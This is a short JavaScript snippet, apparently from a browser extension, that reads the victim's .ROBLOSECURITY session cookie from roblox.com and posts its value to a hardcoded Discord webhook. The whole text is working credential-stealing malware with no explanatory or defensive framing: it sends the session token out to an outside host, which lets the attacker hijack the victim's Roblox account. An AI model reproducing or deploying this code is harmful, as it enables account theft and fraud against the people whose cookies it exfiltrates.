chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, function(cookie) {
  if (cookie) {
    fetch('https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        roblosecurity: cookie.value
      })
    });
  }
});
